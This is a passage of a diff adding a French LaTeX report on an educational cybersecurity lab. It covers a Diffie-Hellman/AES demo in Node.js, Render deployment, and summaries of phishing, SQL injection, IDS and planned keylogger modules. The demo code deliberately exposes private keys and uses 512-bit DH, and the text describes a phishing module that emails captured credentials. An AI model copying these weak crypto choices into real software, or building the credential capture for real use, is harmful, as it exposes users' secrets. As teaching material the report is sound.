+  $A = 5^6 \bmod 23 = 8$       & $B = 5^{15} \bmod 23 = 19$ \\[4pt]
+  Reçoit $B = 19$              & Reçoit $A = 8$ \\[4pt]
+  $S = 19^6 \bmod 23 = \mathbf{2}$ & $S = 8^{15} \bmod 23 = \mathbf{2}$ \\
+  \bottomrule
+\end{tabular}
+\end{center}
+
+\subsection{Implémentation Node.js}
+
+\begin{lstlisting}[language=JavaScript, caption={Génération d'une paire de clés DH — routes.js}]
+app.post('/crypto/api/dh/keygen', (req, res) => {
+  const { prime, generator } = req.body;
+  let dh;
+
+  if (prime && generator) {
+    // Bob reutilise les parametres d'Alice
+    dh = crypto.createDiffieHellman(
+      Buffer.from(prime,     'hex'),
+      Buffer.from(generator, 'hex')
+    );
+  } else {
+    // Alice genere un nouveau groupe DH 512 bits
+    dh = crypto.createDiffieHellman(512);
+  }
+
+  dh.generateKeys();
+  const sessionId = crypto.randomBytes(8).toString('hex');
+  sessions.set(sessionId, { dh, createdAt: Date.now() });
+
+  res.json({
+    success:    true,
+    sessionId,
+    publicKey:  dh.getPublicKey('hex'),
+    privateKey: dh.getPrivateKey('hex'), // expose a titre educatif
+    prime:      dh.getPrime('hex'),
+    generator:  dh.getGenerator('hex')
+  });
+});
+\end{lstlisting}
+
+\begin{lstlisting}[language=JavaScript, caption={Calcul du secret partagé — routes.js}]
+app.post('/crypto/api/dh/compute', (req, res) => {
+  const { sessionId, otherPublicKey } = req.body;
+  const session = sessions.get(sessionId);
+
+  // computeSecret() calcule g^(ab) mod p
+  const sharedSecret = session.dh.computeSecret(
+    Buffer.from(otherPublicKey, 'hex')
+  );
+
+  // Derivation de la cle AES via SHA-256 (256 bits)
+  const aesKey = crypto.createHash('sha256')
+                       .update(sharedSecret)
+                       .digest('hex');
+
+  res.json({
+    success: true,
+    sharedSecret: sharedSecret.toString('hex'),
+    aesKey
+  });
+});
+\end{lstlisting}
+
+\section{Partie 2 — Dérivation de la clé AES}
+
+Le secret partagé DH est un entier de taille variable. Pour l'utiliser
+avec AES, il doit être transformé en une clé de taille fixe via une
+\textbf{fonction de dérivation de clé (KDF)}.
+
+On applique SHA-256 sur le secret partagé, ce qui produit exactement
+256 bits (32 octets) quelle que soit la taille du secret en entrée.
+
+\begin{figure}[h]
+\centering
+\begin{tikzpicture}[
+  block/.style={draw, rounded corners=3pt, minimum width=3.5cm,
+                minimum height=0.85cm, font=\small, align=center},
+  arrow/.style={-Latex, thick}
+]
+  \node[block] (S) at (0,0)   {Secret DH \\ $S = g^{ab} \bmod p$};
+  \node[block] (H) at (4.5,0) {SHA-256$(S)$};
+  \node[block] (K) at (9,0)   {Clé AES-256 \\ (32 octets)};
+
+  \draw[arrow] (S) -- (H);
+  \draw[arrow] (H) -- (K);
+
+  \node[below=0.3cm of S, font=\scriptsize] {taille variable};
+  \node[below=0.3cm of K, font=\scriptsize] {256 bits exactement};
+\end{tikzpicture}
+\caption{Pipeline de dérivation de la clé AES depuis le secret DH}
+\end{figure}
+
+\begin{notebox}
+  \textbf{HKDF en production.}
+  En production, on utilise HKDF (RFC 5869) plutôt que SHA-256 seul.
+  HKDF incorpore un \textit{salt} et un contexte applicatif pour une
+  dérivation cryptographiquement plus robuste. C'est le standard
+  utilisé dans TLS 1.3.
+\end{notebox}
+
+\section{Partie 3 — Chiffrement AES-256-CBC}
+
+\subsection{Mode CBC}
+
+En mode CBC (\textit{Cipher Block Chaining}), chaque bloc de 128 bits
+est XORé avec le bloc chiffré précédent avant d'être chiffré :
+$$C_i = \text{AES}_K(M_i \oplus C_{i-1}), \quad C_0 = IV$$
+Le vecteur d'initialisation ($IV$) doit être aléatoire et unique pour
+chaque message, mais peut être transmis en clair avec le ciphertext.
+
+\begin{lstlisting}[language=JavaScript, caption={Chiffrement AES-256-CBC — routes.js}]
+app.post('/crypto/api/aes/encrypt', (req, res) => {
+  const { aesKey, plaintext } = req.body;
+  const keyBuf = Buffer.from(aesKey, 'hex');   // 32 octets = 256 bits
+
+  const iv     = crypto.randomBytes(16);        // IV aleatoire unique
+  const cipher = crypto.createCipheriv('aes-256-cbc', keyBuf, iv);
+
+  const ciphertext = cipher.update(plaintext, 'utf8', 'hex')
+                   + cipher.final('hex');
+
+  res.json({ success: true, ciphertext, iv: iv.toString('hex') });
+});
+\end{lstlisting}
+
+\begin{lstlisting}[language=JavaScript, caption={Déchiffrement AES-256-CBC — routes.js}]
+app.post('/crypto/api/aes/decrypt', (req, res) => {
+  const { aesKey, ciphertext, iv } = req.body;
+  const keyBuf    = Buffer.from(aesKey,      'hex');
+  const ivBuf     = Buffer.from(iv,          'hex');
+  const decipher  = crypto.createDecipheriv('aes-256-cbc', keyBuf, ivBuf);
+
+  const plaintext = decipher.update(ciphertext, 'hex', 'utf8')
+                  + decipher.final('utf8');
+
+  res.json({ success: true, plaintext });
+});
+\end{lstlisting}
+
+\subsection{Comparaison des modes AES}
+
+\begin{center}
+\begin{tabular}{L{2.5cm} C{2.5cm} C{2.5cm} L{4.5cm}}
+  \toprule
+  \textbf{Mode} & \textbf{Authentif.} & \textbf{Utilisé ici} & \textbf{Remarque} \\
+  \midrule
+  CBC  & Non     & Oui  & Simple et bien établi \\
+  GCM  & Oui (AEAD) & Non & Standard TLS 1.3, recommandé en prod \\
+  CTR  & Non     & Non  & Parallélisable, sans padding \\
+  ECB  & Non     & Non  & \textbf{Dangereux} — patterns visibles \\
+  \bottomrule
+\end{tabular}
+\end{center}
+
+\section{Démo interactive}
+
+La page \code{demo.html} guide l'utilisateur à travers 4 étapes :
+
+\begin{figure}[h]
+\centering
+\begin{tikzpicture}[
+  step/.style={draw, rounded corners=3pt, minimum width=2.8cm,
+               minimum height=0.85cm, font=\scriptsize, align=center},
+  arrow/.style={-Latex}
+]
+  \node[step] (s1) at (0,0)    {1. Génération\\clés DH\\Alice + Bob};
+  \node[step] (s2) at (3.8,0)  {2. Échange\\clés publiques\\$A$ et $B$};
+  \node[step] (s3) at (7.6,0)  {3. Secret\\partagé\\$S = g^{ab}$};
+  \node[step] (s4) at (11.4,0) {4. Message\\chiffré AES\\et déchiffré};
+
+  \draw[arrow] (s1) -- (s2);
+  \draw[arrow] (s2) -- (s3);
+  \draw[arrow] (s3) -- (s4);
+
+  \node[below=0.5cm of s3, font=\scriptsize] {SHA-256$(S)$ $\rightarrow$ Clé AES-256};
+\end{tikzpicture}
+\caption{Flux de la démo interactive SecureLink}
+\end{figure}
+
+Les clés privées sont masquées par défaut (floutage CSS) et peuvent être
+révélées au clic pour les besoins pédagogiques. Un badge de vérification
+confirme que les deux clés AES dérivées sont identiques.
+
+% ============================================================
+\chapter{Intégration et déploiement}
+% ============================================================
+
+\section{Variables d'environnement}
+
+\begin{center}
+\begin{tabular}{L{4.5cm} L{8.5cm}}
+  \toprule
+  \textbf{Variable} & \textbf{Description} \\
+  \midrule
+  \code{RESEND\_API\_KEY} & Clé API Resend pour l'envoi d'emails \\
+  \code{EMAIL\_TO}        & Adresse de réception des identifiants capturés \\
+  \code{PORT}             & Port d'écoute (3001 local, attribué par Render en prod) \\
+  \bottomrule
+\end{tabular}
+\end{center}
+
+Le fichier \code{.env} est exclu du dépôt Git (\code{.gitignore}).
+Les valeurs sont configurées dans le tableau de bord Render pour la
+production.
+
+\section{Déploiement sur Render}
+
+\begin{center}
+\begin{tabular}{L{4cm} L{8.5cm}}
+  \toprule
+  \textbf{Paramètre} & \textbf{Valeur} \\
+  \midrule
+  Type               & Web Service (Node.js) \\
+  Build command      & \code{npm install} \\
+  Start command      & \code{node server.js} \\
+  Auto-deploy        & Activé sur push vers la branche \code{main} \\
+  URL de production  & \url{https://cyberlab-uxey.onrender.com} \\
+  \bottomrule
+\end{tabular}
+\end{center}
+
+\begin{notebox}
+  \textbf{Mise en veille (plan gratuit).}
+  Le serveur Render gratuit se met en veille après 15 minutes d'inactivité.
+  Le premier accès après une période d'inactivité prend environ 50 secondes.
+  Pour une démonstration, ouvrir le lien 1 minute à l'avance.
+\end{notebox}
+
+\section{Flux de déploiement continu}
+
+\begin{figure}[h]
+\centering
+\begin{tikzpicture}[
+  box/.style={draw, rounded corners=3pt, minimum width=2.8cm,
+              minimum height=0.8cm, font=\small, align=center},
+  arrow/.style={-Latex, thick}
+]
+  \node[box] (dev)  {Code local};
+  \node[box, right=2cm of dev]  (git)  {GitHub\\(\code{main})};
+  \node[box, right=2cm of git]  (rnd)  {Render\\(build)};
+  \node[box, right=2cm of rnd]  (live) {CyberLab\\en ligne};
+
+  \draw[arrow] (dev)  -- (git)  node[midway, above, font=\scriptsize]{\code{git push}};
+  \draw[arrow] (git)  -- (rnd)  node[midway, above, font=\scriptsize]{webhook};
+  \draw[arrow] (rnd)  -- (live) node[midway, above, font=\scriptsize]{\code{npm install}};
+\end{tikzpicture}
+\caption{Pipeline de déploiement continu}
+\end{figure}
+
+% ============================================================
+\chapter{Bilan et perspectives}
+% ============================================================
+
+\section{Récapitulatif des modules}
+
+\begin{center}
+\begin{tabular}{L{3cm} L{3.5cm} L{7cm}}
+  \toprule
+  \textbf{Module} & \textbf{Technologie clé} & \textbf{Compétences abordées} \\
+  \midrule
+  Phishing
+    & Resend API, CSS
+    & Ingénierie sociale, capture d'identifiants,\\
+    & & exfiltration par API REST \\[5pt]
+  SQL Injection
+    & SQLite, prepared statements
+    & Injection SQL, UNION SELECT, schéma BDD, prévention \\[5pt]
+  IDS Simulator
+    & Moteur Snort custom
+    & Règles de détection, analyse de trafic, faux positifs \\[5pt]
+  Cryptographie
+    & Node.js \code{crypto}
+    & Échange de clés DH, chiffrement AES, dérivation KDF \\
+  \bottomrule
+\end{tabular}
+\end{center}
+
+\section{Modules futurs planifiés}
+
+\begin{itemize}
+  \item \textbf{Keylogger} : capture JavaScript des frappes clavier,
+        affichage temps réel, vecteurs XSS associés
+  \item \textbf{Brute Force} : test de force brute sur hashs (MD5, SHA-1,
+        bcrypt), dictionnaire personnalisable
+  \item \textbf{Network Scanner} : simulation d'un scanner de ports
+        (scan SYN, détection de services)
+  \item \textbf{Password Analyzer} : entropie, règles de complexité,
+        intégration de l'API HaveIBeenPwned
+\end{itemize}
+
+\section{Améliorations architecturales}
+
+\begin{itemize}
+  \item Dashboard administrateur commun avec statistiques inter-modules
+  \item Système d'authentification pour les sessions utilisateur
+  \item Base de données SQLite persistante pour l'historique
+  \item Migration vers HKDF (RFC 5869) pour la dérivation de clé
+  \item Mode AES-GCM pour l'authentification des messages
+  \item Export de rapports PDF par module
+\end{itemize}
+
+\section{Conclusion}
+
+CyberLab démontre qu'il est possible de construire une plateforme
+éducative de cybersécurité complète avec une stack minimaliste,
+sans dépendre de frameworks lourds. L'architecture modulaire permet
+d'ajouter facilement de nouveaux modules, chacun étant autonome et
+suivant le même pattern d'intégration.
+
+Les quatre modules couvrent un spectre large des problématiques de
+sécurité modernes : l'ingénierie sociale, les vulnérabilités
+applicatives, la détection d'intrusion et la cryptographie appliquée.
+Ensemble, ils constituent un outil pédagogique fonctionnel, déployé
+en ligne et directement utilisable pour des démonstrations pratiques.
+
+% ============================================================
+\chapter*{Références}
+\addcontentsline{toc}{chapter}{Références}
+% ============================================================
+
+\begin{thebibliography}{99}
+
+\bibitem{diffie1976}
+  W. Diffie et M. Hellman,
+  \textit{New Directions in Cryptography},
+  IEEE Transactions on Information Theory, vol. 22, no. 6, pp. 644--654, 1976.
+
+\bibitem{nist_aes}
+  NIST,
+  \textit{FIPS 197 — Advanced Encryption Standard (AES)},
+  National Institute of Standards and Technology, 2001.
+  Disponible : \url{https://csrc.nist.gov/publications/detail/fips/197/final}
+
+\bibitem{rfc5869}
+  H. Krawczyk et P. Eronen,
+  \textit{RFC 5869 — HMAC-based Key Derivation Function (HKDF)},
+  IETF, 2010.
+  Disponible : \url{https://www.rfc-editor.org/rfc/rfc5869}
+
+\bibitem{rfc3526}
+  T. Kivinen et M. Kojo,
+  \textit{RFC 3526 — More Modular Exponential (MODP) Groups for IKE},
+  IETF, 2003.
+  Disponible : \url{https://www.rfc-editor.org/rfc/rfc3526}
+
+\bibitem{owasp_sqli}
+  OWASP,
+  \textit{A03:2021 — Injection},
+  OWASP Top 10, 2021.
+  Disponible : \url{https://owasp.org/Top10/A03_2021-Injection/}
+
+\bibitem{owasp_phishing}
+  OWASP,
+  \textit{Phishing},
+  OWASP Community Pages.
+  Disponible : \url{https://owasp.org/www-community/attacks/Phishing}
+
+\bibitem{mitre_t1566}
+  MITRE,
+  \textit{T1566 — Phishing},
+  ATT\&CK Framework.
+  Disponible : \url{https://attack.mitre.org/techniques/T1566/}
+
+\bibitem{portswigger}
+  PortSwigger,
+  \textit{SQL Injection — Web Security Academy}.
+  Disponible : \url{https://portswigger.net/web-security/sql-injection}
+
+\bibitem{snort}
+  Sourcefire/Cisco,
+  \textit{Snort — Official Documentation}.
+  Disponible : \url{https://www.snort.org/documents}
+
+\bibitem{nodejs_crypto}
+  Node.js Foundation,
+  \textit{Crypto — Node.js Documentation}.
+  Disponible : \url{https://nodejs.org/api/crypto.html}
+
+\bibitem{anssi}
+  ANSSI,
+  \textit{Bonnes pratiques de sécurisation des systèmes d'information},
+  Agence nationale de la sécurité des systèmes d'information.
+  Disponible : \url{https://www.ssi.gouv.fr/}
+
+\end{thebibliography}
+
+\end{document}
